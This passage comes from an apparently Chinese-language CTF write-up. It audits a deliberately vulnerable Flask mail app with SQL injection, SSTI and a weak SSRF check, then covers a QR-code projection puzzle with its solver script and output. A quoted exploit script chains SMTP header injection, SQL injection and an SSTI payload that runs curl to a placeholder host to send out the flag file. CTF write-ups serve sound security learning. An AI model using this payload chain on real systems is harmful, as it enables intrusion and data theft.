class="hljs-keyword">return</span> subject<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;ERROR&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fetch_page_content</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-keyword">try</span>:<br>        parsed_url = urlparse(url)<br>        <span class="hljs-keyword">if</span> parsed_url.scheme != <span class="hljs-string">&#x27;http&#x27;</span> <span class="hljs-keyword">or</span> parsed_url.hostname != <span class="hljs-string">&#x27;ezmail.org&#x27;</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;SSRF Attack!&quot;</span><br>        response = requests.get(url)<br>        <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-keyword">return</span> response.text<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;ERROR&quot;</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;ERROR&quot;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/report&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">report</span>():<br>    message = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&quot;POST&quot;</span>:<br>        url = request.form[<span class="hljs-string">&quot;url&quot;</span>]<br>        content = request.form[<span class="hljs-string">&quot;content&quot;</span>]<br>        smtplib._quote_periods = <span class="hljs-keyword">lambda</span> x: x<br>        mail_content = <span class="hljs-string">&quot;&quot;&quot;From: ignored@ezmail.org\r\nTo: admin@ezmail.org\r\nSubject: &#123;url&#125;\r\n\r\n&#123;content&#125;\r\n.\r\n&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">try</span>:<br>            server = smtplib.SMTP(<span class="hljs-string">&quot;ezmail.org&quot;</span>)<br>            mail_content = smtplib._fix_eols(mail_content)<br>            mail_content = mail_content.<span class="hljs-built_in">format</span>(url=url, content=content)<br>            server.sendmail(<span class="hljs-string">&quot;ignored@ezmail.org&quot;</span>, <span class="hljs-string">&quot;admin@ezmail.org&quot;</span>, mail_content)<br>            message = <span class="hljs-string">&quot;Submitted! Now wait till the end of the world.&quot;</span><br>        <span class="hljs-keyword">except</span>:<br>            message = <span class="hljs-string">&quot;Send FAILED&quot;</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;report.html&quot;</span>, message=message)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/bot&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bot</span>():<br>    requests.get(<span class="hljs-string">&quot;http://ezmail.org:3000/admin&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;The admin is checking your advice(maybe)&quot;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/admin&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">admin</span>():<br>    ip = request.remote_addr<br>    <span class="hljs-keyword">if</span> ip != <span class="hljs-string">&quot;127.0.0.1&quot;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Forbidden IP&quot;</span><br>    subject = get_subjects(<span class="hljs-string">&quot;admin&quot;</span>, <span class="hljs-string">&quot;p@ssword&quot;</span>)<br>    <span class="hljs-keyword">if</span> subject.startswith(<span class="hljs-string">&quot;http://ezmail.org&quot;</span>):<br>        page_content = fetch_page_content(subject)<br>        <span class="hljs-keyword">return</span> render_template_string(<span class="hljs-string">f&quot;&quot;&quot;</span><br><span class="hljs-string">                &lt;h2&gt;Newest Advice(from myself)&lt;/h2&gt;</span><br><span class="hljs-string">                &lt;div&gt;<span class="hljs-subst">&#123;page_content&#125;</span>&lt;/div&gt;</span><br><span class="hljs-string">        &quot;&quot;&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/news&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">news</span>():<br>    news_id = request.args.get(<span class="hljs-string">&quot;id&quot;</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> news_id:<br>        news_id = <span class="hljs-number">1</span><br><br>    conn = sqlite3.connect(<span class="hljs-string">&quot;news.db&quot;</span>)<br>    cursor = conn.cursor()<br><br>    cursor.execute(<span class="hljs-string">f&quot;SELECT title FROM news WHERE id = <span class="hljs-subst">&#123;news_id&#125;</span>&quot;</span>)<br>    result = cursor.fetchone()<br>    conn.close()<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> result:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Page not found.&quot;</span>, <span class="hljs-number">404</span><br>    <span class="hljs-keyword">return</span> result[<span class="hljs-number">0</span>]<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">3000</span>)<br></code></pre></td></tr></table></figure><p>审计代码：</p><ul><li><code>/report</code> 路由可以指定 <code>url</code>（邮件中的 <code>Subject</code>）和 <code>content</code> 作为 <code>ignored@ezmail.org</code> 向 <code>admin``@ezmail.org</code> 发送邮件；</li><li><code>/bot</code> 路由可以从本地发起一次对 <code>/admin</code> 路由的 get 请求；</li><li><code>/admin</code> 路由仅允许本地访问，通过 <code>get_subjects</code> 获取来自 <code>admin@ezmail.org</code> 的邮件的 <code>subject</code>，经过 <code>fetch_page_content</code> 检查并访问 url 后将返回内容用于 <code>render_template_string</code> 的页面渲染，存在 SSTI 风险；</li><li><code>/news</code> 路由存在参数 <code>id</code> 直接动态拼接进行 SQL 查询，明显存在 SQL 注入；</li></ul><p>想要 SSTI 就需要 bot 发起请求，且 <code>Subject</code> 里的 url 请求返回中有 SSTI payload，要想让靶机去获取 <code>Subject</code> 需要邮件从 <code>admin@ezmail.org</code> 发出，已知 <code>/report</code> 可以发送 <code>Subject</code> 可控的邮件，那么还需要一些特殊处理才能伪造邮件来源是 <code>admin@ezmail.org</code>，并确保 <code>Subject</code> 里的 url 访问后会返回一个 SSTI payload，所以总体思路就是：</p><ol><li>向 <code>/report</code> 传参，<code>content</code> 随意，<code>url</code> 处则利用 <code>/news</code> 的 SQL 注入漏洞写一条 <code>/news?id=-1 union select &lt;SSTI payload&gt;</code> 用于返回 SSTI payload，在末尾利用换行符 <code>\r\n</code> 注入 smtp 的 From 头来伪造邮件来源。</li><li>再访问 <code>/bot</code>，bot 访问 <code>/admin</code>，<code>get_subjects</code> 获取 <code>Subject</code> 内容，<code>fetch_page_content</code> 访问 <code>Subject</code> 中的 url 触发 ssrf 进行一次 SQL 注入并获得 SSTI payload，然后 SSTI payload 成功注入触发 SSTI。</li></ol><p>这里放一个<a href="https://blog.xmcve.com/2025/04/27/ACTF2025-Writeup/#title-11">星盟安全团队的 exp</a>，蛮清晰的</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> <span class="hljs-type">time</span><br><span class="hljs-keyword">import</span> requests<br><br>url = &quot;http://223.112.5.141:60524/&quot;<br># SSTI Payload<br>payload = &quot;&#123;&#123;lipsum.__globals__.os.popen(\&quot;curl%<span class="hljs-number">20</span>http://x.x.x.x:<span class="hljs-number">7788</span>/`cat /flag|base64`\&quot;).read()&#125;&#125;&quot;<br># 邮件头注入<br>subject = f&quot;http://ezmail.org:3000/news?id=-1 UNION SELECT &#x27;&#123;payload&#125;&#x27;\r\nFrom: admin@ezmail.org\r\nResent-From: admin@ezmail.org&quot;<br><br>start = <span class="hljs-type">time</span>.time()<br><br>data = &#123;&quot;url&quot;: subject, &quot;content&quot;: &quot;haha&quot;&#125;<br>res_1 = requests.post(f&quot;&#123;url&#125;/report&quot;, data=data)<br>res_2 = requests.<span class="hljs-keyword">get</span>(f&quot;&#123;url&#125;/bot&quot;)print(<span class="hljs-type">time</span>.time() - <span class="hljs-keyword">start</span>)<br></code></pre></td></tr></table></figure><h1 id="QQQRcode"><a href="#QQQRcode" class="headerlink" title="QQQRcode"></a>QQQRcode</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pyzbar.pyzbar <span class="hljs-keyword">import</span> decode<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_input</span>():<br>    input_data = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;give me your data:&quot;</span>)<br>    <span class="hljs-keyword">if</span> (<br>        <span class="hljs-built_in">any</span>(<span class="hljs-keyword">not</span> c <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;01&quot;</span> <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> input_data)<br>        <span class="hljs-keyword">or</span> <span class="hljs-built_in">len</span>(input_data) != <span class="hljs-number">21</span> * <span class="hljs-number">21</span> * <span class="hljs-number">21</span><br>        <span class="hljs-keyword">or</span> input_data.count(<span class="hljs-string">&quot;1&quot;</span>) &gt;= <span class="hljs-number">390</span><br>    ):<br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;Invalid input&quot;</span>)<br>    <span class="hljs-keyword">return</span> input_data<br><span class="hljs-comment"># 5i1encee：输入数据必须全为0或1、长度等于21^3、1的数量小于390</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_data</span>(<span class="hljs-params">input_str</span>):<br>    data = [[[<span class="hljs-literal">False</span>] * <span class="hljs-number">21</span> <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">21</span>)] <span class="hljs-keyword">for</span> __ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">21</span>)]<br>    index = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> z <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">21</span>):<br>        <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">21</span>):<br>            <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">21</span>):<br>                <span class="hljs-keyword">if</span> index &lt; <span class="hljs-built_in">len</span>(input_str):<br>                    data[x][y][z] = input_str[index] == <span class="hljs-string">&quot;1&quot;</span><br>                    index += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> data<br><span class="hljs-comment"># 5i1encee：解析数据。先初始化21*21*21的三维数组为False，输入数据为1则对应数组元素置1</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_image</span>(<span class="hljs-params">matrix, module_size=<span class="hljs-number">10</span></span>):<br>    size = <span class="hljs-built_in">len</span>(matrix) * module_size<br>    img = Image.new(<span class="hljs-string">&quot;1&quot;</span>, (size, size), <span class="hljs-number">1</span>)<br>    pixels = img.load()<br><br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(matrix)):<br>        <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(matrix[<span class="hljs-number">0</span>])):<br>            <span class="hljs-keyword">if</span> matrix[x][y]:<br>                <span class="hljs-keyword">for</span> dx <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(module_size):<br>                    <span class="hljs-keyword">for</span> dy <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(module_size):<br>                        px = x * module_size + dx<br>                        py = y * module_size + dy<br>                        <span class="hljs-keyword">if</span> px &lt; size <span class="hljs-keyword">and</span> py &lt; size:<br>                            pixels[px, py] = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">return</span> img<br><span class="hljs-comment"># 5i1encee：创建图像。先初始化一个全白图像，输入二维布尔矩阵，一个布尔值对应一个10*10像素块，matrix[x][y]为True则绘制黑色像素块</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_qr</span>(<span class="hljs-params">image</span>):<br>    decoded = decode(image)<br>    <span class="hljs-keyword">return</span> decoded[<span class="hljs-number">0</span>].data.decode(<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">if</span> decoded <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-comment"># 5i1encee：解析二维码，提取数据并转换为UTF-8字符串</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">proof_of_work</span>():<br>    proof = <span class="hljs-string">&quot;&quot;</span>.join(<br>        [random.choice(string.ascii_letters + string.digits) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>)]<br>    )<br>    digest = sha256(proof.encode()).hexdigest()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;sha256(XXXX+%s) == %s&quot;</span> % (proof[<span class="hljs-number">4</span>:], digest))<br>    x = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Give me XXXX:&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(x) != <span class="hljs-number">4</span> <span class="hljs-keyword">or</span> sha256((x + proof[<span class="hljs-number">4</span>:]).encode()).hexdigest() != digest:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Sorry~ bye~&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Right!&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><span class="hljs-comment"># 5i1encee：要计算一个 4 字符前缀，使其与已知后缀的SHA256哈希匹配。跟master of movie那个差不多一样</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> proof_of_work():<br>        exit(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">try</span>:<br>        input_str = read_input()<br>        data = parse_data(input_str)<br>        front = [<br>            [<span class="hljs-built_in">any</span>(data[x][y][z] <span class="hljs-keyword">for</span> z <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">21</span>)) <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">21</span>)]<br>            <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">21</span>)<br>        ]<br>        left = [<br>            [<span class="hljs-built_in">any</span>(data[x][y][z] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">21</span>)) <span class="hljs-keyword">for</span> z <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">21</span>)]<br>            <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">21</span>)<br>        ]<br>        top = [<br>            [<span class="hljs-built_in">any</span>(data[x][y][z] <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">21</span>)) <span class="hljs-keyword">for</span> z <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">21</span>)]<br>            <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">21</span>)<br>        ]<br>        projections = [front, left, top]<br>        validation = [<span class="hljs-string">&quot;Azure&quot;</span>, <span class="hljs-string">&quot;Assassin&quot;</span>, <span class="hljs-string">&quot;Alliance&quot;</span>]<br>        <span class="hljs-keyword">for</span> projection, word <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(projections, validation):<br>            content = decode_qr(create_image(projection))<br>            <span class="hljs-keyword">if</span> content != word:<br>                <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;Invalid content&quot;</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Error: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        exit(<span class="hljs-number">0</span>)<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-built_in">print</span>(f.read())<br><span class="hljs-comment"># 5i1encee：三面的投影生成的二维码解码出来的要对应那三个字符串的说</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>根据源码，我们要先通过 <code>proof_of_work()</code>（防爆破的？sha256 爆一下就能过），然后提交长度为 21*21*21 且 1 的数量小于 390 的 01 字符串，读为 21*21*21 的三维矩阵，而后对 front、left、top 三面进行投影（有 1 则 1，无 1 则 0），投影后产生的三个二维矩阵分别生成三个图像并按二维码解码，得到的三个字符串内容要分别等于”Azure”, “Assassin”, “Alliance”，最后得到 flag。</p><p>那么要提交符合要求的 01 字符串就先上述流程反推一下写个脚本：先根据”Azure”, “Assassin”, “Alliance”生成三个二维码的 21*21 二维矩阵，然后将三个二维矩阵对应三面合并入一个三维矩阵中，如何合并则要考虑如何尽可能的复用 1 减少出现次数。</p><p>第一次的想法最简单，让最外层那三面原模原样放上去，其他面和内部全置 0，本地测试发现 1 的数量超标了。</p><p>所以后面再加了一段代码处理，就是把上一步完成后，当内部某点的三个投影面同时用到 1 时就将内部该点置 1，最外层对应三点置 0，这样每有一个同时需要三面投影的点就可以减少两个 1 的使用，本地运行成功通过限制。</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs prolog">import qrcode<br><br>def generate_qr_matrix(text):<br>    qr = qrcode.<span class="hljs-symbol">QRCode</span>(<br>        version=<span class="hljs-number">1</span>,  # <span class="hljs-number">21</span>*<span class="hljs-number">21</span><br>        error_correction=qrcode.constants.<span class="hljs-symbol">ERROR_CORRECT_L</span>,<br>        box_size=<span class="hljs-number">1</span>,<br>        border=<span class="hljs-number">0</span>,<br>    )<br>    qr.add_data(text)<br>    qr.make(fit=<span class="hljs-symbol">True</span>)<br>    img = qr.get_matrix()<br>    return [[cell for cell in row] for row in img]<br><br><br>def construct_3d_matrix(azure, assassin, alliance):<br>    data = [[[<span class="hljs-symbol">False</span> for <span class="hljs-symbol">___</span> in range(<span class="hljs-number">21</span>)] for <span class="hljs-symbol">__</span> in range(<span class="hljs-number">21</span>)] for <span class="hljs-symbol">_</span> in range(<span class="hljs-number">21</span>)]<br>    # <span class="hljs-symbol">Front</span>投影：x-y <span class="hljs-symbol">Azure</span><br>    for x in range(<span class="hljs-number">21</span>):<br>        for y in range(<span class="hljs-number">21</span>):<br>            if azure[x][y]:<br>                data[x][y][<span class="hljs-number">0</span>] = <span class="hljs-symbol">True</span><br>    # <span class="hljs-symbol">Left</span>：y-z <span class="hljs-symbol">Assassin</span><br>    for y in range(<span class="hljs-number">21</span>):<br>        for z in range(<span class="hljs-number">21</span>):<br>            if assassin[y][z]:<br>                data[<span class="hljs-number">0</span>][y][z] = <span class="hljs-symbol">True</span><br>                print(<span class="hljs-string">&quot;1&quot;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br>            else:<br>                print(<span class="hljs-string">&quot;0&quot;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br>        print()<br>    # <span class="hljs-symbol">Top</span>：x-z <span class="hljs-symbol">Alliance</span><br>    for x in range(<span class="hljs-number">21</span>):<br>        for z in range(<span class="hljs-number">21</span>):<br>            if alliance[x][z]:<br>                data[x][<span class="hljs-number">0</span>][z] = <span class="hljs-symbol">True</span><br>    # 这里得从<span class="hljs-number">1</span>到<span class="hljs-number">21</span>，原本写得<span class="hljs-number">0</span>到<span class="hljs-number">21</span>，导致最外层的面重复操作了<br>    for x in range(<span class="hljs-number">1</span>,<span class="hljs-number">21</span>):<br>        for y in range(<span class="hljs-number">1</span>,<span class="hljs-number">21</span>):<br>            for z in range(<span class="hljs-number">1</span>,<span class="hljs-number">21</span>):<br>                if data[x][y][<span class="hljs-number">0</span>] and data[<span class="hljs-number">0</span>][y][z] and data[x][<span class="hljs-number">0</span>][z]:<br>                    data[x][y][z] = <span class="hljs-symbol">True</span><br>                    data[x][y][<span class="hljs-number">0</span>] = <span class="hljs-symbol">False</span><br>                    data[<span class="hljs-number">0</span>][y][z] = <span class="hljs-symbol">False</span><br>                    data[x][<span class="hljs-number">0</span>][z] = <span class="hljs-symbol">False</span><br><br>    return data<br><br>def data_to_input(data):<br>    input_str = []<br>    for z in range(<span class="hljs-number">21</span>):<br>        for y in range(<span class="hljs-number">21</span>):<br>            for x in range(<span class="hljs-number">21</span>):<br>                input_str.append(<span class="hljs-string">&#x27;1&#x27;</span> if data[x][y][z] else <span class="hljs-string">&#x27;0&#x27;</span>)<br>    return <span class="hljs-string">&#x27;&#x27;</span>.join(input_str)<br><br><br>azure = generate_qr_matrix(<span class="hljs-string">&quot;Azure&quot;</span>)<br>assassin = generate_qr_matrix(<span class="hljs-string">&quot;Assassin&quot;</span>)<br>alliance = generate_qr_matrix(<span class="hljs-string">&quot;Alliance&quot;</span>)<br><br>data1 = construct_3d_matrix(azure, assassin, alliance)<br><br>data = data_to_input(data1)<br>print(any(not c in <span class="hljs-string">&quot;01&quot;</span> for c in data))<br>print(len(data) != <span class="hljs-number">21</span> * <span class="hljs-number">21</span> * <span class="hljs-number">21</span>)<br>print(data.count(<span class="hljs-string">&quot;1&quot;</span>) &gt;= <span class="hljs-number">390</span>)<br>print(data.count(<span class="hljs-string">&quot;1&quot;</span>))<br>print(data)<br></code></pre></td></tr></table></figure><p>得到 data 如下</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">111111101011101111111100000000000000000000100000000000000001001100000000000000000101100000000000000001001100000000000101000001100000000000000010001000000000100000000000110000000000000110011100000010000100001000100000000000001010000100001010000000001100100000010000011001001000000000000001000001110000000000000000111100000000000000000101100110100010000000000100100000010100000000100000000010010000000100000001010001000000100110000000100010000100000000000001000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000100000000000000000000000000000000000000000010000000000000000000000000000000000000000000100000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000100000000000001000000000000000000000000000001000000000000000000000100000000000000000000010000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000100000000000000000100000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000001000000000000000000000000000100000000000000000001000000000000000000000000000000000000000000001100000000001001000001000000000000000000000000100000000000000000001000000000000000000000000100000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000100100000000000000000000100000000000000000000000000000000000000000000000000000000001000100000000100001001001000000000000000000000000010000000000000000000000100000000000000001000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000010000000000001000000000000000000000000000000100000000000000000000000100000000000000000000100000000101000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000100000000000000000000000000000000001100000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000100000000000000000101000000100000000000000000000000000001000000000010000000000000000000100000000000000000000000001000000000000010000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000100000000000000000000000000000001000000000000000000000000010000000000000000000000000000010000000000000000010000100000000000000000000000000000000000001000100000000000000000000000000001110100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001001111000000000000000000000000000000000000000000000000000100000000000000000001000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000100000000000000000000000000000000000000000000000001000000000000000100000000000000000000000000000